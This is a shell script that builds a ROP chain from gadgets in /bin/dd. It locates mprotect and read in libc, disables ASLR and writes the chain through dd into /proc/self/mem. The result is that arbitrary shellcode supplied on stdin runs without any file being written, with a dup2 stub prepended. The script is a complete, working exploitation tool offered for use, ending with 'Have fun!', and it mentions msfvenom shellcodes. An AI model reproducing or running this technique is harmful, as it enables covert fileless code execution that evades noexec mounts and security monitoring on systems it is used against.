#!/bin/sh

# A long filename may shift the stack too much which may oblige to lower the
# `write_to_addr' variable.
filename=/bin/dd
# Position in the stack we start to overwrite. We are trying to overflow
# write()'s stack and take control from there.
write_to_addr=$((0x7fffffffe000))

# Address where to load the first stage (must be initially mapped)
base_addr=0000555555555000

# Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
# Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
DEBUG=0

# Endian conversion
endian()
{
    local result=""
    result=${1:14:2}
    result=${result}${1:12:2}
    result=${result}${1:10:2}
    result=${result}${1:8:2}
    result=${result}${1:6:2}
    result=${result}${1:4:2}
    result=${result}${1:2:2}
    result=${result}${1:0:2}
    echo -n "$result"
}

# search_section "file" $filename $section
# search_section "bin" $filename $section (and the binary through stdin)
search_section()
{
    local data=""
    if [ $1 = "file" ]
    then
        local header=$(od -v -t x1 -N 64 $2 | head -n -1 |\
                       cut -d' ' -f 2- | tr -d ' \n')
    else
        read -r data
        local header=$(echo -n $data | base64 -d | od -v -t x1 -N 64 |\
                       head -n -1 | cut -d' ' -f 2- | tr -d ' \n')
    fi
    local shoff=${header:80:16}
    shoff=$(endian $shoff)
    shoff=$((0x$shoff))
    local shentsize=${header:116:4}
    shentsize=$(endian $shentsize)
    shentsize=$((0x$shentsize))
    local shentnum=${header:120:4}
    shentnum=$(endian $shentnum)
    shentnum=$((0x$shentnum))
    local shsize=$((shentnum * shentsize))
    local shstrndx=${header:124:4}
    shstrndx=$(endian $shstrndx)
    shstrndx=$((0x$shstrndx))
    if [ $1 = "file" ]
    then
        sections=$(od -v -t x1 -N $shsize -j $shoff $2 | head -n-1 |\
            cut -d' ' -f2- | tr -d ' \n')
    else
        sections=$(echo -n $data | base64 -d | od -v -t x1 -N $shsize -j \
                   $shoff | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    fi

    local shstrtab_off=$((((shstrndx * shentsize) + 24) * 2))
    shstrtab_off=${sections:$shstrtab_off:16}
    shstrtab_off=$(endian $shstrtab_off)
    shstrtab_off=$((0x$shstrtab_off))
    local shstrtab_size=$((((shstrndx * shentsize) + 32) * 2))
    shstrtab_size=${sections:$shstrtab_size:16}
    shstrtab_size=$(endian $shstrtab_size)
    shstrtab_size=$((0x$shstrtab_size))
    if [ $1 = "file" ]
    then
        local strtab=$(od -v -t x1 -N $shstrtab_size -j $shstrtab_off $2 |\
                       head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    else
        local strtab=$(echo -n $data | base64 -d | od -v -t x1 -N \
                       $shstrtab_size -j $shstrtab_off | head -n-1 |\
                       cut -d' ' -f2- | tr -d ' \n')
    fi

    for i in $(seq $((shentnum - 1)))
    do
        local section=${sections:$((i * shentsize * 2)):$((shentsize * 2))}
        local section_name_idx=$((0x$(endian ${section:0:8})))
        local name=$(echo -n $3 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
        tr -d ' \n')00
        local section_name=${strtab:$section_name_idx * 2:${#name}}
        if [ $section_name = $name ]
        then
            local section_off=${section:24 * 2:16}
            section_off=$(endian $section_off)
            section_off=$((0x$section_off))

            local section_addr=${section:16 * 2:16}
            section_addr=$(endian $section_addr)
            section_addr=$((0x$section_addr))

            local section_size=${section:32 * 2:16}
            section_size=$(endian $section_size)
            section_size=$((0x$section_size))

            local section_size_ent=${section:56 * 2:16}
            section_size_ent=$(endian $section_size_ent)
            section_size_ent=$((0x$section_size_ent))
            
            echo -n $section_off $section_size $section_addr $section_size_ent
            break
        fi
    done
}
# search_symbol $filename $symbol1 $symbol2
# (the slowest part of this script, with difference)
search_symbol()
{
    local strtab_off=$(search_section file $1 .dynstr)
    local strtab_size=$(echo $strtab_off | cut -d' ' -f2)
    strtab_off=$(echo $strtab_off | cut -d' ' -f1)
    local strtab=$(od -v -t x1 $1 -N $strtab_size -j $strtab_off| head -n-1 |\
    cut -d' ' -f2- | tr -d ' \n')

    local symtab_off=$(search_section file $1 .dynsym)
    local symtab_size=$(echo $symtab_off | cut -d' ' -f2)
    local symtabentsize=$(echo $symtab_off | cut -d' ' -f4)
    symtab_off=$(echo $symtab_off | cut -d' ' -f1)
    local symtab=$(od -v -t x1 $1 -N $symtab_size -j $symtab_off| head -n-1 |\
    cut -d' ' -f2- | tr -d ' \n')
    local symtab_ent_num=$((symtab_size / symtabentsize))

    local name1=$(echo -n $2 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
    tr -d ' \n')00
    local name2=$(echo -n $3 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
    tr -d ' \n')00
    local len=0
    local aux=""
    if [ ${#name1} -ge ${#name2} ]
    then
        len=${#name1}
    else
        len=${#name2}
        aux=$name1
        name1=$name2
        name2=$aux
    fi

    local symbol1_off=""
    local symbol2_off=""
    for i in $(seq $((symtab_ent_num - 1)))
    do
        local symtabent=${symtab:$((i*symtabentsize*2)):$((symtabentsize*2))}
        local symbol_name_idx=$((0x$(endian ${symtabent:0:8})))
        local symbol_name=${strtab:$symbol_name_idx * 2:$len}
        if [ $symbol_name = $name1 ]
        then
            symbol1_off=${symtabent:8 * 2:16}
            symbol1_off=$(endian $symbol1_off)
            symbol1_off=$((0x$symbol1_off))
        fi
        if [ ${symbol_name:0:${#name2}} = $name2 ]
        then
            symbol2_off=${symtabent:8 * 2:16}
            symbol2_off=$(endian $symbol2_off)
            symbol2_off=$((0x$symbol2_off))
        fi

        if [ -n "$symbol2_off" -a -n "$symbol1_off" ]
        then
            if [ -z $aux ]; then echo -n $symbol1_off $symbol2_off
            else                 echo -n $symbol2_off $symbol1_off; fi
            break
        fi
    done
}

read_text()
{
    local text_off=$(search_section file $1 .text)
    local text_size=$(echo $text_off | cut -d' ' -f2)
    text_off=$(echo $text_off | cut -d' ' -f1)
    local text=$(tail $1 -c +$text_off | head -c $text_size |\
    od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
    echo -n $text $text_off
}
find_gadget()
{
    local after=${1#*$4}
    local off=$((${#1} - ${#after} - ${#4}))
    off=$((off / 2))
    off=$((off + $2 + 0x$3 - 1))

    printf $(endian $(printf %016x $off))
}
craft_rop()
{
    # Where is located the libc without ASLR in this system
    local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 |\
                      cut -d'-' -f1)
    libc_base=$((0x$libc_base))

    local text=$(read_text $filename)
    local text_off=$(echo -n $text | cut -d' ' -f2)
    text=$(echo -n $text | cut -d' ' -f1)
    local pop_rdi=$(find_gadget $text $text_off $dd_base "5fc3")
    local pop_rsi=$(find_gadget $text $text_off $dd_base "5ec3")
    local pop_rdx=$(find_gadget $text $text_off $dd_base "5ac3")
    local ret=$(find_gadget $text $text_off $dd_base "c3")
    local map_size=$(((0x$1 & (~0xfff)) + 0x1000))
    map_size=$(endian $(printf %016x $map_size))
    base_addr=$(endian $base_addr)

    # Find address of mprotect() and read() in the libc
    local mprotect_offset=$(search_symbol $libc_path mprotect read)
    local read_offset=$(echo $mprotect_offset | cut -d' ' -f2)
    mprotect_offset=$(echo $mprotect_offset | cut -d' ' -f1)
    local mprotect_addr=$(($mprotect_offset + $libc_base))
    mprotect_addr=$(endian $(printf "%016x" $mprotect_addr))
    local read_addr=$(($read_offset + $libc_base))
    read_addr=$(endian $(printf "%016x" $read_addr))

    local rop=""
    rop=$rop$pop_rdi
    rop=$rop$base_addr
    rop=$rop$pop_rsi
    rop=$rop$map_size
    rop=$rop$pop_rdx
    rop=$rop"0300000000000000" # RW
    rop=$rop$mprotect_addr

    rop=$rop$pop_rdi
    rop=$rop"0000000000000000"
    rop=$rop$pop_rsi
    rop=$rop$base_addr
    rop=$rop$pop_rdx
    rop=$rop$(endian $1)
    rop=$rop$read_addr

    rop=$rop$pop_rdi
    rop=$rop$base_addr
    rop=$rop$pop_rsi
    rop=$rop$map_size
    rop=$rop$pop_rdx
    rop=$rop"0500000000000000" # R X
    rop=$rop$mprotect_addr

    rop=$rop$base_addr

    local retsled=""
    for i in $(seq $(((4096 - ${#rop} / 2) / 8)))
    do
        retsled=$retsled$ret
    done
    echo -n $retsled$rop
}

if [ $(command -v linux64) ]
then
    noaslr="linux64 -R"
elif [ $(command -v setarch) ]
then
    noaslr="setarch `uname -m` -R"
else
    echo Error: I need some tool to disable ASLR. >&2
    exit
fi

# Make zsh behave somewhat like bash
if [ -n "$(/proc/self/exe --version 2> /dev/null | grep zsh)" ]
then
    setopt SH_WORD_SPLIT
    setopt KSH_ARRAYS
fi

# Read shellcode from stdin
if [ "$1" = "-x" ]
then
    read -r sc
else
    sc=$(od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
fi
# dup2(2, 1); dup2(2, 0);
sc="4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f05"$sc
# A shellcode may rely on having some space above in the stack. Our ROP leaves
# the rsp pointing exactly to the last address of the stack. So let's decrease
# this register and give some space to breath for these dumb shellcodes
# (looking at you... msfvenom).
sc="4881ec00010000"$sc
sc_len=$((${#sc} / 2))
sc_len=$(printf %016x $sc_len)


# dd's mappings
dd_maps=$(linux64 -R $filename if=/proc/self/maps 2> /dev/null)
# Where is the dd binary loaded without ASLR
dd_base=0000$(echo "$dd_maps" | grep -w $(readlink -f $filename) |\
              head -n1 | cut -d'-' -f1)

# Which interpreter (loader) does this dd need?
interp_off=$(search_section file $filename .interp)
interp_size=$(echo $interp_off | cut -d' ' -f2)
interp_off=$(echo $interp_off | cut -d' ' -f1)
interp=$(tail -c +$(($interp_off + 1)) $filename |\
         head -c $((interp_size - 1)))
interp_addr=$((interp_off + $((0x$dd_base))))
interp_addr=$(printf %016x $interp_addr)

# Find path to the libc
libc_path=$(LD_TRACE_LOADED_OBJECTS=1 $filename < /dev/null 2> /dev/null)
if [ -n "$libc_path" ] # System with ld
then
    libc_path=$(echo "$libc_path" | grep libc)
    libc_path=$(echo $libc_path | cut -d' ' -f3)
    libc_path=$(readlink -f $libc_path)
else # System with musl
    libc_path=$($interp --list $filename | grep libc)
    libc_path=$(echo $libc_path | cut -d' ' -f3)
fi

## 1st payload: Craft the ROP
rop=$(craft_rop $sc_len)
rop_len=$((${#rop} / 2))

payload=$(echo -n $rop$sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
# Have fun!
printf $payload |\
(sleep .1; $noaslr env -i $filename bs=$rop_len count=1 of=/proc/self/mem \
seek=$write_to_addr conv=notrunc oflag=seek_bytes iflag=fullblock) 2>&1
